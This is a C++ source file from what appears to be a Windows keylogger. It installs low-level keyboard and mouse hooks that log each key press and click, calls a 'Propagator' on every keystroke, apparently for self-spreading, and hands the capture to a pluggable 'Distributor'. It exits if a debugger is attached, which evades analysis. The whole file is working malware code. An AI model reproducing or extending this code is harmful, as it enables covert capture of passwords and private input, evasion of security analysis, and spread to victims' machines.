#include "Payload.h"

Payload *Payload::current = NULL;
HINSTANCE Payload::Instance;
HHOOK Payload::KeyboardHook;
HHOOK Payload::MouseHook;

Payload::Payload(void)
{
}

Payload::~Payload(void)
{
}

void Payload::init(void)
{
	if (!StaticTools::Log.is_open()) {
		StaticTools::Log.open(StaticTools::GetProjectResourceDirectory() + "\\.log", std::ios::app | std::ios::out);
	}
	_keylogger.init();
	_ppgt.init();
}

void Payload::createKeyboardHook(void)
{
	Payload::KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, Payload::Instance, NULL);
	Payload::MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, Payload::Instance, NULL);
}

void Payload::deleteKeyboardHook(void)
{
	UnhookWindowsHookEx(Payload::KeyboardHook);
	UnhookWindowsHookEx(Payload::MouseHook);
}

void Payload::setApplicationPath(std::string const& appliPath)
{
	_ppgt.setApplicationPath(appliPath);
}

void Payload::setDistributor(std::shared_ptr<IDistributor> ptr)
{
	_keylogger.setDistributor(ptr);
}

Propagator &Payload::propagator(void)
{
	return (_ppgt);
}

Keylogger &Payload::keylogger(void)
{
	return (_keylogger);
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (IsDebuggerPresent()) {
		exit(42);
	}

	if (nCode == HC_ACTION) {
		Payload::current->propagator().update();

		LPKBDLLHOOKSTRUCT key = (LPKBDLLHOOKSTRUCT)(lParam);
		
		switch (wParam)
		{
		case WM_SYSKEYDOWN:
			Payload::current->keylogger().keyPressed(key);
			break;
		case WM_KEYDOWN:
			Payload::current->keylogger().keyPressed(key);
			break;
		case WM_SYSKEYUP:
			Payload::current->keylogger().keyReleased(key);
			break;
		case WM_KEYUP:
			Payload::current->keylogger().keyReleased(key);
			break;
		}
	}
	return (CallNextHookEx(Payload::KeyboardHook, nCode, wParam, lParam));
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (IsDebuggerPresent()) {
		exit(42);
	}

	if (nCode == HC_ACTION) {
		LPMSLLHOOKSTRUCT mouse = (LPMSLLHOOKSTRUCT)(lParam);
		switch (wParam)
		{
		case WM_LBUTTONUP:
			Payload::current->keylogger().mouseClick(MouseEvent::ME_Left, mouse);
			break;
		case WM_RBUTTONUP:
			Payload::current->keylogger().mouseClick(MouseEvent::ME_Right, mouse);
			break;
		};
	}
	return (CallNextHookEx(Payload::MouseHook, nCode, wParam, lParam));
}